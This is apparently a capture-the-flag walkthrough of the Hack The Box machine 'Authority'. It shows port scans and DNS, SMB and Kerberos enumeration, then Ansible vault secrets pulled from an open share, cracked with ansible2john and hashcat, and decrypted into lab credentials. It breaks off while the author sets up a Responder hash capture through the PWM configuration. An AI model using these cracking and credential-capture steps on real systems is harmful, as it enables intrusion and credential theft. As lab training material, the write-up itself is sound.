## RUSTSCAN:

```Bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-07-16 12:01:45Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T12:02:46+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2023-07-16T12:02:46+00:00; +4h00m00s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-07-16T12:02:46+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d494:7710:6f6b:8100:e4e1:9cf2:aa40:dae1
| SHA-1: dded:b994:b80c:83a9:db0b:e7d3:5853:ff8e:54c6:2d0b
|_ssl-date: 2023-07-16T12:02:46+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8443/tcp  open  ssl/https-alt syn-ack ttl 127
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-13T23:01:36
| Not valid after:  2025-07-15T10:40:00
| MD5:   775c:2f7c:d11b:bf97:8e94:4e13:986e:844a
| SHA-1: 6d24:194b:38cf:4dca:65fe:083d:6f2b:0b62:ae2f:0afb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Sun, 16 Jul 2023 12:01:51 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Sun, 16 Jul 2023 12:01:51 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Sun, 16 Jul 2023 12:01:57 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65279/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65323/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/16%Time=64B3A3EE%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\x2016\x20Ju
SF:l\x202023\x2012:01:51\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Su
SF:n,\x2016\x20Jul\x202023\x2012:01:51\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Sun,\
SF:x2016\x20Jul\x202023\x2012:01:51\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Sun,\x2016\x20Jul\x202023\x2012:01
SF::57\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=7/16%OT=53%CT=%CU=35797%PV=Y%DS=2%DC=T%G=N%TM=64B3A426%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M550NW8NNS%O2=M550NW8NNS%O3=M550NW8%O4=M550NW8NNS%O5=M550NW8NNS%O6=M550NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M550NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 64473/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 55308/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45856/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48869/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-07-16T12:02:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

As we can see there are plenty of open services out there, and my suggestion is to add to our local hosts file the FQDN we found on LDAP service and move on from there.

* * *

## DNS:

Now that we have a probable hostname I will try to do a Domain zone enumeration and see if we can grab some other subdomains since the DNS on port 53 is open.

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# dig any authority.htb @10.10.11.222

; <<>> DiG 9.18.16-1-Debian <<>> any authority.htb @10.10.11.222
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37372
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;authority.htb.			IN	ANY

;; ANSWER SECTION:
authority.htb.		600	IN	A	10.10.11.222
authority.htb.		3600	IN	NS	authority.authority.htb.
authority.htb.		3600	IN	SOA	authority.authority.htb. hostmaster.htb.corp. 173 900 600 86400 3600
authority.htb.		600	IN	AAAA	dead:beef::50
authority.htb.		600	IN	AAAA	dead:beef::16b5:bdb2:5b4e:68a1

;; ADDITIONAL SECTION:
authority.authority.htb. 3600	IN	A	10.10.11.222
authority.authority.htb. 3600	IN	AAAA	dead:beef::50
authority.authority.htb. 3600	IN	AAAA	dead:beef::16b5:bdb2:5b4e:68a1

;; Query time: 32 msec
;; SERVER: 10.10.11.222#53(10.10.11.222) (TCP)
;; WHEN: Sun Jul 16 10:09:26 CEST 2023
;; MSG SIZE  rcvd: 265
```

Ok, checking for any record didn´t gave back anything tangible yet but I see some SOA records which indicates that we could perform a Zone transfer:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# dig axfr @10.10.11.222 authority.htb

; <<>> DiG 9.18.16-1-Debian <<>> axfr @10.10.11.222 authority.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

Ok seems like the zone transfer is not allowed , I guess we can move on for now and we coudl come back if other services didn't lead us to something new.

* * *

## HTTP:

As usual the first step i will do is to try to enumerate for Webdirectories and then for VHOSTS:

- WEB DIRECTORIES:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# dirsearch -u "http://authority.htb"

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/authority.htb/_23-07-16_10-28-57.txt

Error Log: /root/.dirsearch/logs/errors-23-07-16_10-28-57.log

Target: http://authority.htb/

[10:28:57] Starting: 
[10:28:57] 403 -  312B  - /%2e%2e//google.com
[10:29:11] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
```

Nothig so far and what about:

- VHOSTS:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://authority.htb -H "Host:FUZZ.authority.htb" -fl 32

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://authority.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.authority.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 32
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1162 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

Nothing here again, I guess we can move forward with other services.

* * *

## SMB - Port 135,139,445:

Next step is the SMB service where as usual is not that usefull for us on first stages since most likely we need some credentials to perform a enumeration but is worth to enumerate anyway.

Let's run an automatic tool like Enum4linux-ng and see what can we see as guest user:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# enum4linux-ng -A authority.htb
ENUM4LINUX - next generation (v1.3.1)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... authority.htb
[*] Username ......... ''
[*] Random Username .. 'ydjlshaw'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on authority.htb    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for authority.htb    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: authority.htb

 ============================================================
|    NetBIOS Names and Workgroup/Domain for authority.htb    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on authority.htb    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for authority.htb    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: AUTHORITY
NetBIOS domain name: HTB
DNS domain: authority.htb
FQDN: authority.authority.htb
Derived membership: domain member
Derived domain: HTB

 ==========================================
|    RPC Session Check on authority.htb    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'ydjlshaw', password ''
[H] Rerunning enumeration with user 'ydjlshaw' might give more results

 ====================================================
|    Domain Information via RPC for authority.htb    |
 ====================================================
[-] Could not get domain information via 'lsaquery': STATUS_ACCESS_DENIED

 ================================================
|    OS Information via RPC for authority.htb    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 ======================================
|    Users via RPC on authority.htb    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on authority.htb    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on authority.htb    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for authority.htb    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for authority.htb    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 9.42 seconds
```

Ok more than WIndows Server 2019 version and SMB versions not that much.

Let's try to check manually if we can see any SMB share as guest user:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# smbclient -L //authority.htb
Password for [WORKGROUP\root]:

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Department Shares Disk      
    Development     Disk      
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to authority.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Ok there are some shares but can we surf them without credentials?

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads]
└─# smbclient //authority.htb/Department
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
```

Ok the Shared disk "Department" seems like no but the "Development" samba share is working as guest user:

![b0c0d5f43596ea28d919d38b3b1a3057.png](../../../_resources/b0c0d5f43596ea28d919d38b3b1a3057.png)

I will try to dump the whole content locally and check if I can see anything huicy from there! And after a manual analysys seems like nothig much came out of i it except something poiting to a Internal share?

![78463e3138b32c15793d56fbfec2b498.png](../../../_resources/78463e3138b32c15793d56fbfec2b498.png)

But here again we need to have credentials to procede, I will come back later on.

* * *

## KERBEROS:

When we talk about kerberos we can only do 2 things as guest user, one is Kerberos bruteforcing and the other is to check for AS-REP Roastable accounts that don't need pre auth.

- Kerberos User Bruteforce:

```Bash
msf6 auxiliary(gather/kerberos_enumusers) > run

[*] Using domain: AUTHORITY.HTB - authority.htb:88     ...
[+] 10.10.11.222 - User: "guest" is present
[+] 10.10.11.222 - User: "administrator" is present
```

- AS-REP Roastable users:

Nothing came out so far!

I will move on for now.

* * *

## HTTPS - Port 8443:

Moving along with our inital enumeration we know there is another HTTPS service running on a non-standard port TCP 8443, and trying to surf locally we are presented with what seems like a custom LDAP service?

![427c43f7454625d2c15bbb1d2e1387e5.png](../../../_resources/427c43f7454625d2c15bbb1d2e1387e5.png)

From the page we could see is pointing us to "PWM" that could maybe be a Password manager? Reference: https://github.com/pwm-project/pwm

And going back for a moment we saw this in that Development samba share:

![ea184dbe160e90fba8448fc819a58ce8.png](../../../_resources/ea184dbe160e90fba8448fc819a58ce8.png)

Together with probable version used?

![004445a6f5f43c12df5987bd3612a06b.png](../../../_resources/004445a6f5f43c12df5987bd3612a06b.png)

And googling about seems like the last CVE available was from the LOG4j: https://github.com/pwm-project/pwm/issues/628

But it have been fixed in 2.0.2 and from config we are pretty sure it's using the 2.0.3.

Playing around with the service we can see a Service account used by the application:

![8eeac09b3de92121b923f3197c7950f0.png](../../../_resources/8eeac09b3de92121b923f3197c7950f0.png)

This can be useful for us, since SVC accounts usualy are Kerberoastable but we need credentials. So checking again seems like the PWM is in open mode?

![92c2abf1bca943d90ff5a6362c977a5f.png](../../../_resources/92c2abf1bca943d90ff5a6362c977a5f.png)

![7eb73b0834db1a6351584b5d4c7c468a.png](../../../_resources/7eb73b0834db1a6351584b5d4c7c468a.png)

This can help us to gain our first Foothold i guess! Going back on the Documents we found in the share, specifically on this PWM there is the install Documentation:

![d174ed5691db77ea0d4ad72eebd36f36.png](../../../_resources/d174ed5691db77ea0d4ad72eebd36f36.png)

And checking in the defaults/main.yml we can find some passwords:

```Bash
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

Let's try to crack them with hashscat but it's not working telling me the format is wrong, most likely this is the reason: https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/

But it didn't worked out so i went back and in the ADCS share under default we could find another credentials:

![1b2982acaeebef2898ef48e03fe1f591.png](../../../_resources/1b2982acaeebef2898ef48e03fe1f591.png)

And using those credentials on the login didn't worked by throwing an error on the certificate used on LDAPS connection:

![a858f20651d8800e10341514335b879b.png](../../../_resources/a858f20651d8800e10341514335b879b.png)

Ok so I got a tips from a dude on forum and apparently as I thought the ansible-vault decrypt is the wrong way and is failing cause you need the vault config that is only available locally so we have to use instead ansible2john and then hashscat.

Reference: https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible#crack-the-vault

So let's try it:

```bash
//Prepare the hashes
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# ansible2john main.yml > main.vault
File doesn't start with b'$ANSIBLE_VAULT'
                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# ansible2john pwm_login.txt > pwm_login.yes 
                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# ansible2john pwm_pass.txt > pwm_pass.yes
                                                                                                                                                              
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# ansible2john ldap_pass.txt > ldap_pass.yes
```

We have the LDAP password:

```Bash
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# hashcat -a 0 -m 16900 ldap_pass.yes /usr/share/wordlists/rockyou.txt --show      
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```

We have the username:

```Bash
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
```

We have the password:

```Bash
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
```

All those credentials are same cause they all came from same vault, now that we have the password we can use ansible-vault decrypt to decrypt them:

```Bash
//The LDAP password:
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# cat ldap_admin_password.txt | ansible-vault decrypt          
Vault password: 
Decryption successful
DevT3st@123 

//The PWM user:
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# cat pwm_admin_login.txt | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm  


//The PWM password:
┌──(root㉿kali-linux)-[/home/…/Automation_bk/Ansible/PWM/defaults]
└─# cat pwm_admin_password.txt | ansible-vault decrypt 
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

* * *

## Attacking PWM service:

Now that we have our first credentials we could try several things, but we know from a manual Kerbrute enumeration that svc_pwm was not existing on AD.

Now tryng to login on the portal we are presented with a Default Dashboard:

![84c76652f62f7e0262e921602a9f23d2.png](../../../_resources/84c76652f62f7e0262e921602a9f23d2.png)

As we noticed on the beginning we could see that service is still on "Open" mode where we could still do some changes on config. Here can't we do that much on manager dashboard, I tried to download the DB but it's not containing anything important.

Moving on to Configuration editor we can see much more:

![65b54a76c0c1e00db6525c8d7a1b2b91.png](../../../_resources/65b54a76c0c1e00db6525c8d7a1b2b91.png)

And that search field could help us get our first foothold; the idea here is to try to fetch the hash by intercepting the MM-LBRN in Responder:

![9e90dee215a3e8302ce00d093c62ffba.png](../../../_resources/9e90dee215a3e8302ce00d093c62ffba.png)

Saving and then trying to login with any username should invoke to our machine! Edit: it's not working so I guess we have to point that to our machine instead. I decided to create a Test profile(it's used do connect several environment or connection strings):

